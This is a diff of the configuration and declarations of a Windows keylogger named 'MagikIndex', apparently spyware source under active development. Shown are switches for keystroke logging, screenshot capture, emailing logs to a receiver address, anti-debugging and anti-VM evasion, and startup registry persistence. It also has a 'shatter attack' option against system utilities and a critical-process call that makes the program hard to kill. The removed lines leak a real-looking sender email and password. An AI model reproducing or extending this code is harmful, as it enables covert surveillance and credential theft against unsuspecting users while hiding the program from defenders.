@@ -16,7 +16,6 @@
 #include <iterator>
 #include <memory>
 #include <set>
-#include <vector>
 #include <comdef.h>
 #include <comutil.h>
 #include <Shldisp.h>
@@ -28,37 +27,63 @@
 #include <array>
 #include <winioctl.h>
 #include <shlwapi.h>
+#include <lm.h>
+#include <psapi.h>
+#include <thread>
+#include <Wbemidl.h>
+
+
 
 #include "Antidbg.h"
 #include "log.h"
+//#include "lz4\lz4.h"
 #include "base64.h"
 
 using buffer = std::vector<char>;
 
 //------------------------------------------------------
-// Customization
+//                 Customization
+//------------------------------------------------------
 
-//#define debug               //whether or not to crypt files and shatter-attack system utilities [REMOVE THIS FLAG]
-#define KeyShiftLimit 1223  //cap for the highest possible random encryption key
 
-#define IsMajor false
-#define CurrentVersion 1.6
-#define CharactersPerLog 300
-#define MaximumFolderSize 10 
-#define RequiredRam 2048    //MB
-#define RequiredCores 2 
-#define SecondsBetweenScreenshots 20
-#define ScreenshotsPerZip 4
-#define SendersEmail "indexmagik@gmail.com"
-#define SendersPsw "*MaGiK77"
-#define RecieversEmail "bratvolk913@gmail.com"
-#define MaxInactivity 10    //max amount of seconds since last input
-#define MinRequiredApps 20  //minimum amount of installed programs
-#define SecurityLevel 0     //0-3 levels of trust towards environment
-#define MinHardDisk 60      //minimum size for the main partition
-#define DelayExecution false//whether or not execution should be delayed
-#define DelayTime 120       //amount of time for the delay (seconds)
-#define QuitIfUntrust false //should we send a log if the environment is untrusted or quit on the spot?
+//[ VERSION INFO ]
+#define IsMajor true        //let the program know whether its a Dev build or not
+#define CurrentVersion "2.1"//current version number
+#define GitVersionLink "i\\wnoNw;Yc|LZ\\YvYcpHYVx6Ycj34N6XI\\wn2crfY[P;{cu;ofvSZ[{L4Nv;4[wSpdnTpdxPoenPZfkXJc2n4\\weZ[{;{N8OJe2TJc"//link to GitHub Raw server containing up-to-date version file
+
+//[ LOGS ]
+#define CryptLogs false     //whether or not to crypt files
+#define KeyShiftLimit 122   //cap for the highest possible random encryption key
+#define LogMode 2           //how to log keystrokes                          [ 1 = Timer  ,  2 = Characters-per-log ]
+#define LogTimer 15         //minutes per log                                [ must use mode 2 ]
+#define CharactersPerLog 400//how many characters should be in a log         [ must use mode 1 ]
+#define QuitIfUntrust false  //should we send a log if the environment is untrusted or quit on the spot?
+
+//[ SCREENGRABBING ]
+#define ScreenGrab false     //whether to screenshot at set intervals or not
+#define ScreenshotMode 2    //how to screengrab                              [ 1 = Timer  ,  2 = Screenshot-On-Click ]
+#define SecondsBetweenScreenshots 20        //only works when using the timer
+#define ScreenshotsPerZip 5 //how many screenshots to collect before sending a zip file
+
+//[ EMAIL ]
+#define SendersEmail ""
+#define SendersPsw ""             //IMPORTANT : due to google's cuckhold fetish the "Allow less secure apps" setting has now been removed, you are now required to enable 2-step auth and create an "App Password" for Mail. use the password provided by google in this field.
+#define RecieversEmail ""
+
+//[ ANTI-* ]
+#define ShatterAttack false //wether to shatter attack sys utils(cmd,Run,Taskmgmr)  KEEP DISABLED IN REALWORLD USAGE!
+#define MaxInactivity 10    //max amount of seconds since last input         (anti-dbg feature)
+#define MinRequiredApps 20  //minimum amount of installed programs           (anti-dbg feature)
+#define SecurityLevel 2     //0-3 levels of trust towards environment        (anti-dbg feature)
+#define MinHardDisk 60      //minimum size for the main partition(GB)        (anti-dbg feature)
+#define DelayExecution false//whether or not execution should be delayed     (anti-dbg feature)
+#define DelayTime 300       //amount of time for the delay (seconds)         (anti-dbg feature)
+#define RequiredRam 2048    //MB                                             (anti-dbg feature)
+#define RequiredCores 3     //pretty self explanatory                        (anti-dbg feature)
+
+//[ MISC ]
+#define MaximumFolderSize 10//limit of MagikIndex copies in a system
+
 
 //------------------------------------------------------
 
@@ -76,27 +101,41 @@ using buffer = std::vector<char>;
 #pragma comment(lib, "Wininet.lib")
 #pragma comment(lib, "Slwga.lib")
 #pragma comment( lib, "comsuppw.lib" )
-//#pragma comment(lib, "Wbemuuid.lib.")
-
+#pragma comment(lib, "Wbemuuid.lib.")
+#pragma comment(lib, "urlmon.lib")
+#pragma comment(lib, "Netapi32.lib")
+#pragma comment(lib, "shlwapi.lib")
 
 #define _WIN32_WINNT 0x050
 
 extern "C" int RandomGenerator();
-int SilentlyRemoveDirectory(const char* dir);
+extern "C" void __AsmImpossibleDisassm();
+extern "C" void __AsmJmpSameTarget();
+void DeleteDirectory(std::string dir);
 int CalculateDirSize(std::string DirectoryToCheck);
-BOOL RegisterMyProgramForStartup(PCSTR pszAppName, PCSTR pathToExe, PCSTR args);
+void CreateRegistryKey(PCSTR AppName, PCSTR PathToExe);
 ULONG WINAPI Protect(LPVOID);
 std::string GetCpuInfo();
 BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName);
 ULONG WINAPI ScreenGrabber(LPVOID Parameter);
 void TakeScreenShot(const char* filename);
-bool fexists(std::string filename);                          //create native check through CreateFileA()
+BOOL fexists(std::string filename);                          
 void FinalExit();
 //void Compress(const buffer& in, buffer& out);
-LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
-
-
+LRESULT CALLBACK KeyboardThread(int nCode, WPARAM wParam, LPARAM lParam);
+LRESULT CALLBACK MouseThread(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam);
+std::string HardDecode(std::string EncodedString);
+int Hooker(int HookType, HOOKPROC CallbackFunc);
+void TimerThread();
+std::string RetrieveExternalIp(std::string CurrentDir);
+BOOL IsElevated();
+std::string QueryVMI(bstr_t Table, const wchar_t* Item);
 
 typedef std::string String;
 typedef std::vector<String> StringVector;
 typedef unsigned long long uint64_t;
+
+typedef long (WINAPI* RtlSetProcessIsCritical) (
+	IN BOOLEAN	bNew,
+	OUT BOOLEAN* pbOld,
+	IN BOOLEAN	bNeedScb);
